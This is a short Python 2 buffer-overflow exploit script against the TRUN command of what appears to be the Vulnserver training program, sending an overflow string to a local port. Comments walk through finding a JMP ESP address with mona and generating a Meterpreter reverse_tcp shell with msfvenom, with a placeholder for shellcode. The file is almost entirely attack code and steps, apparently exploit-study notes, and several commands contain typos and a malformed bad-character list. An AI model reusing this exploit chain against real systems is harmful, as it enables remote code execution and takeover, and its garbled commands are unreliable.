#!/usr/bin/python
import socket
off = "TRUN /.:/"
off += "A" * 2003
off += "BBBB"
'''
JMPESP locations
      !mona modules - find the one with all falses
      !mona jmp -r esp -m "essfunc.dll" --change
      window to (Winows - log data)
      copy first address of jmp esp
'''
#off += "jmpesp"

'''
msfvenom -p windows/meterpreeter/reverse_tcp
    lhost=<linops> lport=4000 -b
    "\x00\xfe\x20\x0x\0xff" -f python - get shellcode add to script minix first line
  open msfvenom
    use muli/handler
    LPORT = 4444
    set payload windows/meterpreter/reverse_tcp
    exploit 
'''
# paste msfvenom below


s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 1112))
print s.recv(1024)
s.send(off) # add buf to get shell
print s.recv(1024)

s.close()
